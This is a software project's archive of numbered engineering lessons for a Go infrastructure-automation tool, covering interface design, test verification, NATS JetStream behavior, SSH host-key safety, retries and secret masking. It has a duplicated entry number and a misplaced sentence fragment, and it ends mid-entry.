# Lessons Learned Archive

Full reasoning and the incident behind every rule indexed in `LESSONS_LEARNED.md`, same numbering. See `.AGENTS/AGENTS.md`'s Mandatory Documentation Rules for how to append here.

---

# Lessons Learned

Architectural rules derived from hard experience. Append a numbered entry focusing on the rule, not the
story, per `.AGENTS/AGENTS.md`.

1. **A corrected scaffold does not mean corrected code.** `CODE_SCAFFOLD.md` had already been updated to
   the full `InventoryItem` contract by the time this session started, but the live `.go` files still
   implemented the old, smaller interface it warns against. Always check the actual source files, not just
   whether the spec documents agree with each other.

2. **A capability or interface vocabulary lives in exactly one package.** Two packages each declaring their
   own version of the same capability name is the exact collision namespacing exists to prevent, and it
   fails silently: both compile, neither is caught until an audit or a test tries to use the name and gets
   surprised by which definition won.

3. **Storage adapters own their own row-to-domain conversion; the factory never imports the storage
   package.** `internal/inventory/ent_repository.go` converts `*ent.Device` into a storage-agnostic
   `Record`; `ItemFactory.Build` only ever sees `Record`. This is what makes "pluggable state store" a
   property of the code instead of a name in a doc comment: a YAML-backed repository produces the same
   `Record` shape with zero knowledge that ent exists.

4. **Embed synchronization primitives by pointer, always.** A struct holding a `sync.Mutex` or
   `sync.RWMutex` must be constructed once and referenced by pointer from every embedder. `go vet`'s
   copylocks check catches a value-embedded violation, but only if you run vet after the change that
   introduced the copy, not just after the type was first defined.

5. **A Release Gate that says "drives a real execution" cannot honestly close before the executor and
   transport it depends on exist**, no matter how real the surrounding plumbing (parsing, validation, DAG
   construction) is. Checking the box because everything up to the actual verb works is exactly the
   false-green checkbox the roadmap's Gate 2 exists to catch.

6. **A narrow, single-purpose utility can be built ahead of the phase that "owns" the larger feature it
   feeds**, as long as it is scoped to exactly that utility. `engine.TopologicalOrder` (a Kahn's-algorithm
   ordering function) was built during Part 0 Phase W1/W2 so `pleiades run` could print a real plan before
   Phase W5's DAG executor exists; it does not evaluate CEL conditions or execute anything, which is the
   line that keeps it a reusable primitive for W5 rather than a shadow implementation of it.

7. **`gofmt -w` across an entire repository is unconditionally safe.** It is formatting only, carries zero
   behavioral risk, and `AGENTS.md` declares it mandatory with no exceptions. There is never a reason to
   scope a gofmt pass down to only the files a given session happened to touch.

8. **Test the exact invocation the spec documents, not the invocation that happens to work with a
   library's default behavior.** Go's stdlib `flag` package does not support flags after a positional
   argument; the project's own scaffolding example puts the positional argument first. A CLI's automated
   tests are only meaningful if they run the same argument order a real user, following the docs, would
   actually type.

9. **When a proposed terminology or field-naming decision touches a spec document, read the spec's
   existing usage before inventing a new convention.** `PLAN.md` Section 23 already specified a `type:`
   discriminator field for distinguishing native and Ansible artifacts in a shared repository (originally
   `type: auto-roboto` versus `type: ansible`, later reconciled to `type: native` versus `type: ansible`
   once the product itself was renamed, a value chosen specifically to be product-name-agnostic so it
   would not need to change again). The right move was to reuse that field name for the Crawl-tier runbook
   format's own type marker, not invent a competing `schema:` key. Two different field names solving the
   identical problem is exactly the kind of drift a single spec document exists to prevent.

13. **A value tied to a product name will need to change again the next time the product is renamed; a
    value that names what the thing IS rather than what it is CALLED survives that rename for free.**
    `type: native` (chosen over `type: auto-roboto` or `type: pleiades`) is the concrete example: when
    "Auto-Roboto" was retired in favor of "The Pleiades" later in the same session, every prose reference
    and illustrative binary name needed updating, but the runbook `type` field needed no change at all.

10. **A rename is only as good as the unscoped grep that follows it.** Scoping a terminology rename to
    "files that import or reference the type/field being renamed" is the right way to execute the rename,
    but it will miss files that reused the same word independently, with no structural coupling (a
    comment, a test's example string, a log field name chosen by convention rather than by importing a
    shared constant). Always follow a scoped rename with one final, unscoped, whole-repository grep for the
    literal word, and treat every hit as something to individually justify or fix, not skip because it
    "wasn't in the file list."

11. **Four agents can safely write to the same working directory in parallel only if their file sets are
    genuinely disjoint by design, and each agent's own verification should be scoped to the files it owns,
    not the whole repository.** A repo-wide build run by one agent mid-flight can transiently observe
    another's half-written state; that is expected and not a bug, but it means the authoritative
    build/test/vet pass has to happen once, after all parallel work lands, run by whoever is doing
    integration.

12. **When Go's own visibility rules (`internal/`) block a promise the spec makes (third parties can add
    new concrete types without touching core), a package-layout refactor cannot satisfy that promise by
    itself.** Splitting device types into per-vendor packages under `internal/inventory/devices/` improves
    modularity, but genuine out-of-module extensibility requires the factory and its DTOs to live under
    `pkg/`, which is a separate, larger decision. Do not let a structural refactor quietly stand in for an
    architectural promise it does not actually deliver; say so explicitly instead.

13. **Two features that both sound like "migration" will be conflated until a document states the boundary
    in a table.** This project carried three: running an unconverted playbook as Ansible in a container
    (Section 23), importing an AWX server's control-plane objects (a former Phase 29), and converting
    Ansible source files into native runbooks (The Forge). Each had a different input and a different
    output, but prose descriptions of them read almost identically, and review time was repeatedly spent
    re-deriving which was which. Prose is where these blur. A table with an explicit Input column and
    Output column is what makes the difference legible, and it belongs in the doc a reader reaches first.

14. **Build the generator before the content it generates, and let the content be the generator's test.**
    A commitment to cover thirty six Ansible modules reads like a mandate to hand-write thirty six
    packages. Inverting it, so the scaffolding tool ships first and then generates the catalog, costs
    nothing in sequence and buys a real release gate: if generating our own catalog with our own scaffold
    is painful, the scaffold is wrong, and we learn that on our own code before an outside author does.
    A hand-written entry that the scaffold should have produced hides exactly the defect worth finding.

15. **A declared-but-unimplemented capability must fail loudly, and the linter must know about it.**
    Shipping a registry of names whose implementations do not exist yet is legitimate: it gives the
    linter and the IDE a complete surface to work against long before every implementation lands. It is
    only safe under three conditions, and all three are structural, not conventions. A stub returns an
    explicit error and never success, because a module that silently does nothing makes a failed run look
    like a successful one. The manifest carries an implementation status as data, not as tribal knowledge.
    A validation rule turns a call to an unimplemented name into a write-time error. Get those three and
    an incomplete catalog is safe, because the tooling tells the truth about what is real.

16. **A store with more than one writer cannot be an ownership ledger, and that decides whether a diff
    engine is possible at all.** Terraform can derive an action from a difference because its state is
    intent-shaped: it records what Terraform itself wrote, so exactly one thing can explain a mismatch.
    An inventory that is observation-shaped, and specifically an observation of a third party that other
    actors also write to, has no such property. "This differs from what I last wrote" stops meaning
    anything the moment more than one actor writes. Before proposing any converge, reconcile, or diff
    feature, count the writers of the record being diffed. More than one means the answer is a report,
    never an action.

17. **Unknown values are containable; unknown actions are contagious.** Terraform's plans work because
    an unresolved value can sit inside a known operation. An ordered task list with `register` and
    `when` produces something different in kind: a task that may not execute at all, which makes every
    later task's precondition unknown too. Any plan or preview feature over control flow, rather than
    data flow, has to answer this before it is designed, not after. A related consequence: a preview
    that mixes predictable and unpredictable steps has only two renderings for the unpredictable ones,
    "no change" (which makes a run that will definitely change something look inert) or "always
    changes" (which is unreviewable), and neither is acceptable.

18. **Verify a type is called before describing what it does.** This project's state model, per-field
    revisions with versions, lifecycle states, and source authority, is correct Go with zero production
    callers, no database columns to persist into, and a read-only repository interface with no write
    path at all. Reading the type definitions and describing the behavior they imply produced a
    confident architectural assessment that was wrong by roughly a factor of five. The check is cheap:
    grep for callers outside tests, and look for the column or the write method. Doing so turns "we
    already have a better state store than Terraform" into "we have a better state store *design*, and
    it has never been written to disk," which leads to an entirely different next step.

19. **`go build ./...` does not build tests, so it cannot tell you a port change broke an
    implementation.** Widening the `Repository` interface with two methods left the build entirely
    green while a mock in a different package no longer satisfied the interface. `go vet ./...`
    type-checks test files and caught it immediately. After any change to an exported interface, vet is
    the check that matters; build will happily tell you everything is fine.

20. **A test that has never been shown to fail has not been shown to test anything.** Both central
    assertions of the new write path were mutation tested before being trusted: reverting the version
    restore in `NewBase` must fail the round-trip test, and deleting the compare-and-swap predicate
    must fail the concurrency test. Both did. This costs about two minutes and is the only thing
    separating a real regression test from `FAILURE_PATTERNS.md` entry 5, a validation test that could
    never actually fail. Do it for any test guarding a subtle invariant, and note in the test comment
    which mutation it catches.

21. **A port with zero production callers can be proven substitutable by a test suite, but not proven
    "selected by wiring in the composition root" until something in the real call graph actually makes
    that selection.** Phase W4 built local adapters behind three ports. `inventory.Repository` already
    had a real caller (`cmd/pleiades/load.go`, which was calling `StaticYAMLPlugin` directly instead of
    going through the port at all), so rewiring that one call site to construct `NewFileRepository`
    closed its Release Gate for real, verified against the built binary's own end-to-end tests.
    `lock.Manager` and `event.Bus` have no production caller anywhere in this codebase yet, by design:
    nothing executes a runbook yet (that is Phase W5/W6), so nothing needs to lock a device or publish an
    event. A shared conformance test suite run against both the local adapter and a real, containerized
    NATS broker (`internal/lock/conformance_test.go`, `internal/event/conformance_test.go`) proves those
    two adapters behave identically to each other, which is genuine, real evidence, but it is evidence of
    substitutability, not evidence of composition-root selection, and the two claims are not the same
    thing. State which one a Release Gate actually has before marking it closed; a port with no caller
    yet cannot honestly claim the second kind of proof regardless of how good its test suite is.

22. **Build a graph-walking primitive against the general shape the type declares, not the special-case
    shape its one current producer happens to emit.** `synthesizeChain` only ever compiles a linked list
    (every node in-degree 1, out-degree 1), and `PATTERNS.md`'s own Composite entry already commits to
    the DAG type supporting real multiple-parent nodes later ("nodes can have multiple parents... the
    structure is explicitly checked for cycles rather than assumed acyclic-by-construction"). Phase W5's
    `LevelIterator` (`internal/engine/level_iterator.go`) and `Executor.Run` (`internal/engine/executor.go`)
    are written against `DAG.Adjacency` generically, grouping by in-degree rather than assuming one node
    per step, so a diamond (two parents converging on one child) already schedules correctly today even
    though nothing in this codebase can author one yet. The alternative, a walker hard-coded to "the next
    single node in the chain," would have worked identically today and silently produced the wrong
    schedule the day parallel task groups or `Register`-inferred edges (this file's own entry 17-adjacent
    territory, `HANDOFF_DOCUMENT.md`'s "highest-value change available" note) landed. Proving this for
    real, not just arguing it, cost one fuzz target (`FuzzLevelIterator`) that builds synthetic diamond
    and chain graphs directly rather than through the tree-walk builder that cannot produce them.

23. **A port's own doc comment can describe a payload shape ("a marshaled JSON string of the Event
    struct") that is easy to violate by accident once a second caller writes to it.** Writing
    `engine.Executor`'s first draft of event publishing, `bus.Publish` was called with a raw, un-enveloped
    JSON payload; every test still passed except the one asserting on a subscriber's decoded field, which
    silently received a zero-valued struct instead of an error, because `json.Unmarshal` happily decodes a
    payload missing an expected field into that field's zero value rather than failing. The fix was
    routing every publish through `event.WrapPayload` like the port's own doc comment already specifies.
    The lesson generalizes past this one call site: a decode-from-JSON boundary that tolerates missing
    fields will not fail loudly on a malformed envelope, so the only reliable proof a caller honors a
    port's payload contract is a test that decodes what a *real subscriber* would decode and asserts on a
    field's actual value, not merely that `Publish` returned `nil`.

24. **Retry belongs strictly before the point of no return, never after it.** `internal/transport/ssh`'s
    `dialWithRetry` retries only the dial phase (TCP connect plus SSH handshake); once a `Session.Run` has
    actually sent a command to the remote side, Phase W6 never retries it, because a network failure
    *during* that call leaves the command's real-world outcome unknown, and retrying an unknown-outcome
    side effect (delete a file twice, restart a service twice) is exactly what this codebase's Convergence
    principle forbids. The general rule: before writing a retry loop around any operation, name the exact
    line past which the operation has externally observable side effects, and never let the loop's retry
    boundary cross it. A retry loop that "wraps the whole function" is only safe if the whole function is
    provably idempotent; a raw remote command never is.

25. **A security-critical default (host key verification, credential exposure) must fail closed on every
    branch, not just the branch you tested.** `internal/transport/ssh/known_hosts.go`'s `hostKeyCallback`
    treats a missing `known_hosts` file, an unset `$HOME`, and a host absent from an existing file all as
    hard errors, and the ONLY bypass is one explicitly named, loudly documented field
    (`InsecureSkipHostKeyVerify`) that defaults false. The lesson is the enumeration discipline itself:
    listing every way the function could be reached (file missing, file present but empty, file present
    but unreadable, `$HOME` unset, explicit opt-out) and deciding each one deliberately, rather than
    handling the one path a happy-path test exercises and letting every other path fall through to
    whatever `golang.org/x/crypto/ssh` does by default (which, for a nil `HostKeyCallback`, is to reject
    the dial entirely, but relying on that as an accidental safety net rather than an explicit decision is
    exactly the kind of gap Phase 39's own audits were built to catch). Apply this same enumeration
    discipline to any new function whose failure mode is "silently less secure" rather than "loudly
    broken."

26. **When an entity needs a stable, opaque public identity but already has a heavily-relied-on internal
    primary key, add a second column rather than changing the primary key's type.** Phase 1's `DeviceID`
    could have been built by switching `Device`'s ent primary key itself from an auto-increment integer to
    a UUID string, which every ORM tutorial shows as "the" way to get an opaque ID. That path would have
    touched every generated edge/FK reference and every existing internal call site that reads `dev.ID` as
    an integer, for a blast radius the actual requirement (an opaque value distinct from the mutable
    `name`, safe to expose on the wire) never asked for. Adding `device_id` as an ordinary indexed, unique,
    immutable column instead, and leaving the integer primary key exactly alone as a pure storage-layer
    detail used only for edges, delivered the same external guarantee for a fraction of the diff and zero
    risk to code nobody was asked to touch. Before widening an identity's *type*, check whether the actual
    requirement can be met by widening its *columns* instead; the more radical change is not automatically
    the more correct one.

27. **When a framework's most-documented path for a feature assumes infrastructure your deployment target
    does not have, look for the simpler primitive the framework already generates before reaching for a
    heavier dependency.** ent's own versioned-migrations documentation leads with the `sql/
    versioned-migration` feature flag plus an Atlas "dev database" (a live, disposable MySQL/Postgres,
    typically Docker), which is a poor fit for a dependency-free embedded-SQLite CLI. The actually-needed
    primitive, diffing an empty database against the desired schema to capture the initial DDL, turned out
    to already exist in the *currently generated* code with no feature flag at all
    (`(*migrate.Schema).WriteTo`), because ent's "automatic migration" and "versioned migration" flows
    share more machinery than the tutorial's framing suggests. The lesson generalizes: when a library's
    headline workflow for a feature assumes infrastructure you do not want to add, read what the library
    already generates for you before adding a new dependency or a heavier workflow to work around the
    assumption; the piece you need may already be sitting in code you have not looked at yet.

28. **RULE 0 ("run the same config the platform runs") applies to the one test whose own stated purpose is
    proving a mechanism, not to every test that happens to touch that mechanism's byproduct.** This phase
    replaced ent's auto-migration with a hand-written versioned-migration runner, which raised the
    question of whether every `enttest.Open`-based test in the repository needed repointing to the new
    path. It does not: the overwhelming majority of those tests exist to prove repository or business
    logic (`Save` round-trips a property, a conformance suite behaves identically across adapters), and an
    auto-migrated schema that is structurally identical to the versioned-migrated one serves that claim
    exactly as well. Only `internal/ent/client_test.go`'s `TestGraphTraversal` needed repointing, because
    it is this phase's own literal Release Gate text ("spin up in-memory SQLite... successfully traverse
    the graph") and its job is specifically to prove the new mechanism produces a working schema. Repointing
    every test "to be safe" would have been a worse outcome than the risk it guards against: it would bury
    the one test whose real job is proving the mechanism among dozens of tests that do not need to care how
    the schema got there, making the actual Release Gate harder to find, not easier to trust.

29. **When a value's secrecy is only known at runtime, the safety check for whether it is even safe to
    substring-mask has to live at the exact call site that adds it to the mask set, not deferred to print
    time.** `internal/credential.Mask` has no minimum-length guard by design: its callers only ever pass
    known SSH credential fields, which are never accidentally short or common. The new secret_fields/
    secret_mask mechanism (`internal/engine/executor_secrets.go`) accepts an arbitrary runtime value,
    where nothing stops it from being a stringified bool or a one-digit exit code; blindly adding that to
    the mask set would scrub that substring out of every later message and printed line for the rest of
    the run, corrupting unrelated output, which is worse than not masking at all. By the time anything
    prints, there is no way to tell a genuine short secret from an unrelated short string that happens to
    match, so the type/length check (`secretMaskValue`: must be a string, must be at least
    `minMaskableSecretLength` bytes) has to run once, at the moment a value is proposed for the mask set,
    and reject there, loudly, without leaking the value itself into the rejection. The general rule: a
    masking mechanism whose input is discovered at runtime, not pre-registered, needs its own safety gate
    at the point of discovery; it cannot inherit the guarantees of a mechanism whose input was always
    known in advance.

30. **A new cross-cutting validation rule's blast radius is every existing test fixture with a permissive
    zero value, not just the tests written for the rule itself.** Adding `LifecycleRule` (plan-time) and
    the executor's matching runtime guard both meant every `inventorytest.Stub` in the whole repository
    suddenly mattered for its `StubState` field, not just the tests that already cared about lifecycle.
    `Stub`'s zero value is `StateDiscovered` (`LifecycleState`'s own `iota` order, not `StateActive`), a
    reasonable default for a stub whose test never mentions lifecycle at all, but it meant a dozen existing
    tests across `internal/validate` and `internal/engine`, none about lifecycle, started failing the
    moment either rule went live, because their devices were now, by the new rule's own correct logic,
    not eligible for real work. None of those tests were wrong; the new rule was newly, correctly, looking
    at a field they had never needed to set. The general rule: before landing a validation or guard that
    inspects a field on a shared test double, grep every construction of that double for whether the field
    is set explicitly, not just whether the double's own package still compiles; a shared test double's
    zero value is a promise to every existing caller, and a new rule that starts reading a previously-
    ignored field breaks that promise for all of them at once, not just the caller who added the field.

31. **A default idempotency/dedup key must be derived from operation identity, not operation content.**
    `internal/event`'s `DefaultIdempotencyKeyDerivation` first hashed a publish's topic plus its domain
    payload, on the reasoning that the envelope's own `ID` field is "freshly minted every call" and
    therefore unsafe to key determinism on. That reasoning conflated two different things: an `ID` is
    minted once, at the moment the caller builds the value (`WrapPayload`), and stays fixed on it for the
    rest of its life, including across a caller-side retry that resends the same already-built value --
    the actual, concrete shape "a retry of the same logical operation" takes in this codebase. Content is
    the wrong axis entirely: two genuinely different operations (two independent health-check pings a
    minute apart) can easily share identical content, and keying on content makes the second one look like
    a duplicate of the first and vanish. The general rule: when a value needs a default identity for
    dedup/idempotency purposes and the caller hasn't supplied one explicitly, key on something that is
    fixed once per logical operation and would differ between any two operations regardless of their
    content (a minted ID, a sequence number), never on the operation's own payload bytes, however tempting
    "deterministic" sounds as a reason to hash content instead. A real NATS container test caught this
    directly (`FAILURE_PATTERNS.md` #29), not a mock -- a hand-rolled fake dedup store would have needed
    the exact same wrong assumption baked into it to even notice.

32. **An ephemeral JetStream pull consumer with no pull request against it is cleaned up by the server
    after `InactiveThreshold` (default 5s), and a test that creates one long before its first `Fetch`
    call will silently read from a consumer that no longer exists.** Several of this session's own
    container tests for `HandleDeliveryFailure`'s dead-letter path created a diagnostic consumer on the
    dead-letter subject at test setup, then spent 10+ seconds waiting through a real redelivery-and-backoff
    cycle before ever calling `Fetch` on it -- long enough for the server to have already garbage-collected
    the idle consumer. The resulting `Fetch` call did not error (a Go client issuing a pull request against
    a consumer the server no longer recognizes does not necessarily surface as a hard error); it just
    returned an empty result, which looked identical to "the dead letter genuinely never arrived" until a
    minimal, tighter repro (create the consumer and `Fetch` back to back, no gap) proved the underlying
    mechanism was correct all along. The general rule: an ephemeral pull consumer used for test assertions
    must be created immediately before the `Fetch` that reads it, not at test setup, whenever anything
    between setup and the read could plausibly exceed a few seconds of real wall-clock time; a durable
    consumer does not have this problem, but reaching for one just to sidestep this would be the wrong fix
    for a diagnostic, one-shot read.

33. **Reusing a fixed message ID across repeated `Publish` calls in a loop (a benchmark, a retry helper)
    silently engages producer-side dedup, and for anything that also waits on a resulting delivery, this
    doesn't just understate a number -- it hangs outright.** `BenchmarkNatsBusPublishSubscribeRoundTrip`'s
    first draft built one `Event` outside its `for i := 0; i < b.N; i++` loop and published the identical
    value every iteration; since the dedup key is the event's own `ID` (see #31), every publish after the
    first was treated as a duplicate of the first and never actually delivered, so the round trip's own
    `<-done` receive blocked forever on the second iteration. `BenchmarkNatsBusPublish` (no delivery to wait
    on) had the identical bug but surfaced only as an artificially fast, non-representative number, not a
    hang -- worth noticing specifically because the *lack* of an obvious failure is what would have let it
    ship unnoticed. The general rule: any loop that calls `Publish` (or an equivalent produce-once
    semantics call) repeatedly for benchmarking or testing purposes needs a fresh identity per iteration,
    the same way a real caller's own distinct operations would each have one; reusing one value across
    iterations is convenient exactly because it's wrong -- it looks like "the same kind of thing happening
    many times" when the dedup layer is specifically designed to collapse "the same thing happening more
    than once" into one.

34. **Reordering a handler's writes to fix a correctness bug can turn a background goroutine's existing,
    previously-benign concurrency into an active race, and only `-race` on the specific reordered path
    will catch it.** `internal/api/logs.go`'s `StreamLogs` originally wrote its own "connected" line before
    starting the JetStream `Consume` call that hands message delivery off to a background goroutine; moving
    `Consume` earlier (to let its own errors still report as an HTTP status, `FAILURE_PATTERNS.md` #32) put
    that background goroutine's first possible write *before* the handler's own subsequent write to the
    same `http.ResponseWriter`, which is not safe for concurrent use. The existing test suite, run without
    `-race`, stayed green throughout both the bug and the fix; only a `-race` run on the file the reorder
    touched surfaced the problem, and by construction a race like this cannot be caught by asserting on
    output content, since Go's race detector flags the unsynchronized access itself, not any particular
    corrupted result it might occasionally produce. The general rule: any change that moves a call which
    hands off work to a new goroutine earlier relative to a caller's own remaining code needs its own
    `-race` run specifically exercising that reordered path before being trusted, not just the pre-existing
    test suite passing under plain `go test`.

35. **Wrapping every publish's payload in a shared envelope is a wire-format change binding on every
    consumer of the raw bytes, including ones that deliberately bypass the port whose own signature
    changed.** Once `internal/api/dispatcher.go` started publishing through `event.Bus.Publish` (which
    wraps a domain payload in the `Event` envelope before it reaches the wire) instead of a raw
    `jetstream.JetStream.PublishMsg` call, `runner.Agent.handleMessage` -- which by deliberate design stays
    on its own pull-based `jetstream.Consumer` rather than going through `Bus.Subscribe`
    (`PATTERNS.md`'s own "Push vs Pull Execution Model" entry) -- silently started decoding the wrong
    layer, since it still expected the old, un-enveloped bytes (`FAILURE_PATTERNS.md` #30). `Agent` is not
    a caller of `Bus.Subscribe` at all, so "grep every caller of the port that changed" would not have
    found it; it shares the wire format the port produces without sharing the port's own interface. The
    general rule: before changing what a shared serialization boundary wraps a payload in, enumerate every
    consumer of the *wire format* (including deliberate, by-design bypasses of whatever port normally
    produces it), not just every caller of the specific function whose signature changed -- and prefer a
    real, cross-process integration test over a narrower unit test for catching this class of bug, since a
    unit test with a hand-built payload will happily encode the same wrong assumption the production bug

36. **A wrapper library's public method signature is a promise about what it exposes, not about what the
    underlying protocol actually supports -- read the library's own source for the lower-level primitive
    before assuming the wrapper cannot do what you need.** Designing Phase 3's real per-key lock TTL, the
    first read of `nats.go` v1.52.0's public `jetstream.KeyValue` interface suggested `Update` could not
    refresh a key's TTL at all (its signature takes no options and its implementation always publishes with
    `ttl=0`), which looked like a hard blocker for a `KeepAlive`-driven Heartbeat renewal. Reading the
    package's own unexported `updateRevision` (what `Create` and `Update` both call internally) showed the
    real primitive was reachable anyway: the exported `jetstream.JetStream.PublishMsg`, plus the exported
    `jetstream.WithExpectLastSequencePerSubject` and `jetstream.WithMsgTTL` options, against the KV bucket's
    own documented subject convention (`$KV.<bucket>.<key>`). Confirmed empirically, not by reading source
    alone: a real `nats:2.11` container proved this genuinely slides the TTL forward and that a stale-CAS
    renewal fails with an error `errors.Is`-matching the same `jetstream.ErrKeyExists` `Create` already
    handles, so the existing contention translation reused cleanly. The general rule: when a wrapper's own
    public surface seems to foreclose something the underlying protocol should support, check whether the
    wrapper's *other* exported functions can reach the same primitive by a different path before concluding
    the capability does not exist -- and prove the workaround actually works against the real system, not
    just that it compiles.

37. **A third-party server's version is real, load-bearing API surface for a feature the client library
    merely wraps -- verify the minimum version empirically against a real instance before designing around
    a capability, rather than assuming whatever version existing tests happen to pin already supports it.**
    Every container test in this repository pinned `nats:2.10` before this phase; Phase 3's real per-key TTL
    design (`jetstream.KeyValueConfig.LimitMarkerTTL`, required for `jetstream.KeyTTL` to have any effect at
    all) genuinely requires `nats-server` 2.11 or newer, confirmed by running both versions against the same
    bucket-creation call in a disposable scratch harness before writing any package code: 2.10 rejected it
    outright (`"limit marker TTLs not supported by server"`); 2.11 accepted it and the TTL itself behaved
    exactly as documented. The version bump was scoped to only the files that actually construct a
    `natsLockManager` against a real container (`internal/lock`'s own two, plus `internal/engine`'s
    scheduler tests, found by grepping for the real constructor call, not by guessing which files might be
    affected) rather than bumped repository-wide, since no other package's tests exercise this specific
    capability. The general rule: a version pin sitting unremarked in existing test files is not evidence
    that version is sufficient for a new capability being designed on top of the same dependency; check it
    against a real instance of the actual version in use, and scope any required bump to the files whose own
    tests actually need the new capability, found by tracing real call sites rather than assumed.

38. **In a CAS-based system, losing a compare-and-swap race is not by itself evidence of real contention --
    only the caller can know whether the operation it lost against was compatible or conflicting, and
    conflating the two silently breaks whichever operation is more common under load.** `natsLockManager`'s
    shared-lock join path lost most of a burst of simultaneous, mutually-compatible `ModeShared` joins to
    exactly this conflation (`FAILURE_PATTERNS.md` #34): every CAS loss, whether against a genuinely
    conflicting exclusive holder or against another equally-valid shared joiner, surfaced as the identical
    `ErrLockHeld`, and `PolicyReject`'s single-attempt contract then correctly honored a signal that was
    wrong for the shared case. The fix moved the distinction to the one place that can actually make it:
    inside the CAS retry itself, which already knows whether the just-read state was mode-compatible before
    the CAS was even attempted. The general rule: a CAS failure means "the state changed since I read it,"
    nothing more; whether that change makes the operation impossible or merely means "read again and retry"
    is a property of what the two racing operations *mean*, not of the CAS mechanism, and that judgment
    belongs at the layer with enough context to make it, not pushed onto every caller as generic contention.

39. **When a spec's contention policy asks for revoking a live, in-use resource and the underlying mutual-
    exclusion guarantee has no way to detect the holder is even still doing something with it, narrow the
    feature to only ever act on what is provably abandoned, and say so explicitly, rather than build the
    literal ask and create a new correctness hazard.** `PLAN.md` Section 13's "priority" contention policy
    describes a higher-priority caller preempting a lower-priority one outright. `engine.Executor.runOne`
    acquires a device lock for the duration of one task's action but never calls `KeepAlive` during it (ttl
    alone bounds the hold); an independent design review (a Plan-agent asked to pressure-test the initial
    "eagerly steal on higher priority" draft, not a test) found that revoking such a lock mid-action would
    let two callers physically execute against the same device concurrently -- worse than the pre-existing,
    already-accepted, already-named risk of an action simply outliving its own ttl. The design was narrowed
    before any code was written: priority is only ever allowed to reclaim an entry whose own declared
    deadline has *already* elapsed (an eager alternative to waiting for the store's own lazy sweep, never a
    revocation of a live hold), and the mechanism ultimately shipped is narrower still -- a client-side,
    priority-weighted retry cadence among waiting contenders, since real per-key TTL made the original
    "eager steal of an expired entry" idea degenerate into something every policy already gets for free once
    the entry is provably gone. The general rule: when a feature's literal spec wording implies revoking
    something whose true liveness this system cannot observe, build the version that only acts on what is
    provably safe, and record the narrower, real contract as a deliberate scope decision -- not a silent
    downgrade -- so a later phase adding real cancellation of in-flight work has a named, honest seam to
    widen instead of a comment that quietly claims more than the code does.
    depends on.

40. **A `select` between a cancellation case and a periodic-work case must treat "canceled the instant a
    tick also fires" and "canceled while the tick's own dispatched call was already in flight" as the
    same expected outcome, not two different code paths that happen to converge by luck.** Go's `select`
    does not prioritize among simultaneously ready cases, so a `ctx.Done()` case and a `ticker.C` case
    becoming ready together can still resolve to the `ticker.C` branch; separately, a call already
    dispatched from an earlier, legitimate tick can still be in flight when cancellation lands
    concurrently, returning `context.Canceled` indistinguishable, at the call site, from a genuine
    failure. `election.LeaderElector.Run` hit both during this phase's own real-container test
    (`FAILURE_PATTERNS.md` #39), logging a `renewal failed` warning on every ordinary graceful shutdown.
    The general rule: any loop selecting between a context's own done-ness and periodic work must check
    `ctx.Err()` at both entry points a race can occur -- before dispatching the next call, and again after
    an error comes back -- and route both to the exact same "this is shutdown, not a failure" handling,
    rather than trusting `select`'s case order or a single check at the top of the loop to cover it.

41. **A benchmark that provisions its own external test infrastructure (a container, a subprocess) inside
    the benchmarked function must register its teardown via `b.Cleanup`, never a naked `defer`.**
    `go test -bench` measures elapsed wall time from `b.ResetTimer()` to the benchmark function's own
    return; a `defer`red call runs during that same return, before the function is considered finished,
    so its cost is silently divided by `b.N` and added to every reported op. `BenchmarkLeaderElectorKeepAlive`
    hit this for real (`FAILURE_PATTERNS.md` #40): several seconds of real container teardown inflated a
    genuine ~0.7ms call to a reported 100ms-2s. `b.Cleanup`-registered functions run strictly after the
    benchmark's own measurement completes, closing this for good rather than requiring every benchmark
    author to remember an explicit `b.StopTimer()` before every `return` path. `internal/lock/nats_bench_test.go`'s
    own `startBenchNats` helper already used the correct pattern; any new benchmark that starts its own
    container or process should copy that helper's shape, not the shape of an ordinary test's setup.

42. **`go test` caches a PASS result per package, build flags, and test binary hash, regardless of whether
    the test itself has real external side effects (starting a container, killing a real process), and
    silently prints `(cached)` instead of re-executing on a later, identical invocation.** Re-running the
    same `go test` command several times in a row to gather multiple independent real measurements (this
    phase's own Release Gate needed several real `SIGKILL`-to-failover timings, per RULE 0) returns the
    exact same cached result every time once the first run has passed and nothing in the package changed,
    which looks identical to genuine repeated runs unless the `(cached)` marker in `go test`'s own summary
    line is specifically checked for. Caught only because five apparently-independent measurements came
    back bit-for-bit identical to the microsecond, an implausible outcome for anything involving real
    process scheduling and container networking. `-count=1` (or any other flag/input change) forces a
    fresh execution every time; any workflow that needs N independent real samples from the same test must
    pass it explicitly, not just re-invoke the same command N times.

43. **Adding a new required env var to a composition root's fail-closed startup check is a breaking change
    to every existing test that spawns that binary as a real OS subprocess, not just to hand-run
    invocations.** `cmd/controller/main.go`'s new `MASTER_ENCRYPTION_KEY` requirement (Phase 5) silently
    broke Phase 4's own `TestControllerLeaderElection_ReleaseGate`, which builds and runs the real
    `controller` binary in three subprocesses: none of them could start at all once the new check landed,
    so the test failed with a symptom (no leader ever elected) that looked unrelated to its actual cause. A
    package's own test suite (`internal/crypto`'s, in this case) cannot catch this: the break is entirely
    in a different package's subprocess-spawning test, only visible to a full `go test ./...` run. Before
    adding a new required startup env var to any binary this repository already spawns as a subprocess in a
    test (`cmd/controller`, `cmd/pleiades`'s SSH release gate), grep that binary's own test files for
    `exec.Command`/`cmd.Env` and update every spawn site in the same change, then confirm with a full
    repo-wide test run, not just the package the env var was added for.

44. **A "did we already process this" failsafe keyed on a single marker field's presence is bypassable by
    anything that controls that field's name.** `encryptPropertiesMap`'s original "already encrypted"
    check asked only "does this map contain a key named `_encrypted`", not "does this map have exactly the
    shape I myself produce." Any caller-controlled data sharing a schema with the marker's own namespace
    (a generic `map[string]interface{}` property bag, here) can collide with a marker name chosen for
    convenience rather than collision-resistance, and turn a safety check into a bypass. When a failsafe
    exists to distinguish "already in the terminal state I produce" from "ordinary input," check the full
    shape that state actually has (field count, value type), not just whether one expected field is
    present -- and do this asymmetrically if the read and write sides have different failure-mode
    requirements: strict on write, where being lenient creates a security hole; lenient on read, where
    being strict trades a loud, correct error for a silent, wrong pass-through.

45. **An interceptor sitting in front of a generated ORM's batch query method must not fail the whole batch
    for one bad row, and single-result methods built on top of a batch query inherit that same exposure.**
    `ent`'s generated `Only`/`Get` are themselves `Limit(2).All(ctx)` plus a length check performed AFTER
    the query (and any interceptor) runs; there is no ent-level way to give a "single result expected"
    caller different treatment from a genuine batch caller, because the interceptor never sees that
